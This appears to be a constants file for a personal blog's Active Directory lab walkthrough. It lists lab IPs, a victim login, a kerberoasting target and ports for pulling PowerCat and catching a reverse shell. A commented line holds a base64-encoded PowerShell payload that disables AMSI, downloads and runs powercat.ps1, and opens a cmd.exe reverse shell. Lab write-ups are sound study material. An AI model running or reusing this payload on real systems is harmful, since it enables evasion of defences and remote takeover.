export const EXAMPLE_PATH = "blog-starter";
export const CMS_NAME = "Markdown";
export const Home = "https://tkokhing.github.io";
export const LOGO_PATH = "/img/logo";
export const REPO_NAME = ""; // for future expansion use
export const T_ANI_GIF_URL = `${LOGO_PATH}/tkokhing.gif`;
export const TKOKHING_LOGO_SVG_URL = `${LOGO_PATH}/tkokhing.svg`;



// AD Setup

// export const MS01_IP_EXT = "192.168.118.173";
// export const MS01_IP_INT = "172.16.242.173";
// export const MS01_FORWARD_PORT_2 = "4444";

// // // for kerberoasted service 
// export const RUNNING_SPN = "svc-auth";

// // // EncodedText for SCSHELL
// export const EncodedText = "encoded_text_for_scshell"


// export const MS02_IP_INT = "172.16.242.176";
// export const MS02_PORT_FORWARD = "4443";

// export const DC01_IP = "172.16.242.162";
// export const DC01_PORT_FORWARD = "4442";


export const ATTACKER_IP = "192.168.118.10";
export const ATTACKER_PORT = "22";

// // Client01 (aka MS01) Browser Viewing
// // - Internal (172.16.242.173)

export const AD_DOMAIN_NAME = "CAR_DOMAIN"

export const MS01_username = "r.andrews";  // updated
export const MS01_password = "BusyOfficeWorker890"; //updated

export const MS01_IP_EXT = "192.168.123.206";  //updated
export const MS01_IP_INT = "172.16.242.173";
export const MS01_FORWARD_PORT_1 = "80";   // To download <u>PowerCat</u>
export const MS01_FORWARD_PORT_2 = "4444"; // To open <u>reverse shell</u>


// // WEB01 (aka MS02) Terminal
// // - Internal (172.16.242.176)
//updated
export const MS02_IP_INT = "172.16.123.202"; //updated
export const MS02_PORT_FORWARD = "4443";

//updated
export const DC01_IP = "172.16.123.200"; //updated
export const DC01_PORT_FORWARD = "4442";

export const AD_ATTACKER_IP = ATTACKER_IP;
export const AD_ATTACKER_LISTEN_PORT_1 = "80";  // To facilitate pulling of <u>PowerCat</u>
export const AD_ATTACKER_LISTEN_PORT_2 = "443"; // To facilitate incoming <u>reverse shell</u> 


// // for kerberoasted service 
export const RUNNING_SPN = "svc-auth";
export const RUNNING_SPN_HASH = "hashhashashashverylong";
export const RUNNING_SPN_PASSWORD = "running_spn_pas$word";


// // EncodedText for SCSHELL
// // // // export const EncodedText = "please_update_encoded_text_for_scshell"
// // // // export const EncodedText = "WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACIAKwAkACgAIgA0ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA1ADUAIAA3ADQAIAA2ADkAIAA2AEMAIAA3ADMAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0AD0AJAByAGUAcwB1AGwAdAArACQAXwB9ADsAJAByAGUAcwB1AGwAdAApACkALgBHAGUAdABGAGkAZQBsAGQAKAAkACgAIgA2ADEAIAA2AEQAIAA3ADMAIAA2ADkAIAA0ADkAIAA2AEUAIAA2ADkAIAA3ADQAIAA0ADYAIAA2ADEAIAA2ADkAIAA2AEMAIAA2ADUAIAA2ADQAIgAuAFMAcABsAGkAdAAoACIAIAAiACkAfABmAG8AcgBFAGEAYwBoAHsAWwBjAGgAYQByAF0AKABbAGMAbwBuAHYAZQByAHQAXQA6ADoAdABvAGkAbgB0ADEANgAoACQAXwAsADEANgApACkAfQB8AGYAbwByAEUAYQBjAGgAewAkAHIAZQBzAHUAbAB0ADIAPQAkAHIAZQBzAHUAbAB0ADIAKwAkAF8AfQA7ACQAcgBlAHMAdQBsAHQAMgApACwAIgBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACIAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsAIABpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgA0ADIALgAxADcAMwAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAKQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA3ADIALgAxADYALgAyADQAMgAuADEANwAzACAALQBwACAANAA0ADQANAAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA"
export const EncodedText = "please_update_encoded_text_for_scshell"


// For all sites VICTIM TAGGING
export const VICTIM1_IP = MS01_IP_EXT;
export const VICTIM1_PORT = MS01_FORWARD_PORT_2;
